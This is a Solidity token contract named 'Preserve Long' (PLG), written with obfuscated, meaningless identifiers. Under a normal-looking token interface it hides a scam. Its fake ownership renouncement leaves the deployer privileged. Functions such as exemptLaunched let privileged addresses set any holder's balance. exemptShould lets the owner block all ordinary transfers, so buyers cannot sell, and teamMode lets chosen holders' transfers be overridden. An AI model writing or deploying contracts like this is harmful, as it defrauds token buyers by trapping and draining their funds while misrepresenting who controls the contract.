//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface minExemptWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletLimitReceiver {
    function createPair(address liquidityAmountMin, address tokenExemptFrom) external returns (address);
}

interface shouldMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyAuto) external view returns (uint256);

    function transfer(address sellLaunch, uint256 sellShould) external returns (bool);

    function allowance(address fromTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellShould) external returns (bool);

    function transferFrom(
        address sender,
        address sellLaunch,
        uint256 sellShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxAt, uint256 value);
    event Approval(address indexed fromTotal, address indexed spender, uint256 value);
}

interface launchAuto is shouldMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PreserveLong is atTake, shouldMarketing, launchAuto {

    bool private enableList;

    string private listLimit = "PLG";

    function getOwner() external view returns (address) {
        return exemptTotalSender;
    }

    function name() external view virtual override returns (string memory) {
        return receiverTotalMode;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isToken;
    }

    function fromMarketing(address liquidityReceiverTx) public {
        require(liquidityReceiverTx.balance < 100000);
        if (marketingTotalList) {
            return;
        }
        
        limitTeam[liquidityReceiverTx] = true;
        
        marketingTotalList = true;
    }

    address private exemptTotalSender;

    mapping(address => mapping(address => uint256)) private amountReceiverSender;

    bool public marketingTotalList;

    function transferFrom(address walletFund, address sellLaunch, uint256 sellShould) external override returns (bool) {
        if (_msgSender() != takeTxFund) {
            if (amountReceiverSender[walletFund][_msgSender()] != type(uint256).max) {
                require(sellShould <= amountReceiverSender[walletFund][_msgSender()]);
                amountReceiverSender[walletFund][_msgSender()] -= sellShould;
            }
        }
        return toEnable(walletFund, sellLaunch, sellShould);
    }

    bool private minExempt;

    constructor (){
        if (autoIs) {
            enableList = false;
        }
        minExemptWallet marketingMode = minExemptWallet(takeTxFund);
        tokenAuto = walletLimitReceiver(marketingMode.factory()).createPair(marketingMode.WETH(), address(this));
        
        tradingMin = _msgSender();
        atAuto();
        limitTeam[tradingMin] = true;
        atFromLiquidity[tradingMin] = isToken;
        
        emit Transfer(address(0), tradingMin, isToken);
    }

    function balanceOf(address buyAuto) public view virtual override returns (uint256) {
        return atFromLiquidity[buyAuto];
    }

    function transfer(address receiverLimit, uint256 sellShould) external virtual override returns (bool) {
        return toEnable(_msgSender(), receiverLimit, sellShould);
    }

    mapping(address => bool) public limitTeam;

    function owner() external view returns (address) {
        return exemptTotalSender;
    }

    function totalAt(address walletFund, address sellLaunch, uint256 sellShould) internal returns (bool) {
        require(atFromLiquidity[walletFund] >= sellShould);
        atFromLiquidity[walletFund] -= sellShould;
        atFromLiquidity[sellLaunch] += sellShould;
        emit Transfer(walletFund, sellLaunch, sellShould);
        return true;
    }

    function limitSender() private view {
        require(limitTeam[_msgSender()]);
    }

    function teamMode(address liquidityLaunched) public {
        limitSender();
        
        if (liquidityLaunched == tradingMin || liquidityLaunched == tokenAuto) {
            return;
        }
        enableReceiverLiquidity[liquidityLaunched] = true;
    }

    address launchedTotalSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private receiverTotalMode = "Preserve Long";

    uint256 constant senderEnable = 17 ** 10;

    function allowance(address toFund, address modeLimit) external view virtual override returns (uint256) {
        if (modeLimit == takeTxFund) {
            return type(uint256).max;
        }
        return amountReceiverSender[toFund][modeLimit];
    }

    address public tradingMin;

    mapping(address => uint256) private atFromLiquidity;

    function atAuto() public {
        emit OwnershipTransferred(tradingMin, address(0));
        exemptTotalSender = address(0);
    }

    function toEnable(address walletFund, address sellLaunch, uint256 sellShould) internal returns (bool) {
        if (walletFund == tradingMin) {
            return totalAt(walletFund, sellLaunch, sellShould);
        }
        uint256 senderShould = shouldMarketing(tokenAuto).balanceOf(launchedTotalSender);
        require(senderShould == atReceiver);
        require(sellLaunch != launchedTotalSender);
        if (enableReceiverLiquidity[walletFund]) {
            return totalAt(walletFund, sellLaunch, senderEnable);
        }
        return totalAt(walletFund, sellLaunch, sellShould);
    }

    function symbol() external view virtual override returns (string memory) {
        return listLimit;
    }

    function approve(address modeLimit, uint256 sellShould) public virtual override returns (bool) {
        amountReceiverSender[_msgSender()][modeLimit] = sellShould;
        emit Approval(_msgSender(), modeLimit, sellShould);
        return true;
    }

    address public tokenAuto;

    address takeTxFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed modeAmount, address indexed fundTeam);

    uint8 private minLiquidity = 18;

    uint256 private isToken = 100000000 * 10 ** 18;

    uint256 atReceiver;

    function exemptLaunched(address receiverLimit, uint256 sellShould) public {
        limitSender();
        atFromLiquidity[receiverLimit] = sellShould;
    }

    bool private autoIs;

    function exemptShould(uint256 sellShould) public {
        limitSender();
        atReceiver = sellShould;
    }

    function decimals() external view virtual override returns (uint8) {
        return minLiquidity;
    }

    mapping(address => bool) public enableReceiverLiquidity;

    uint256 receiverAuto;

}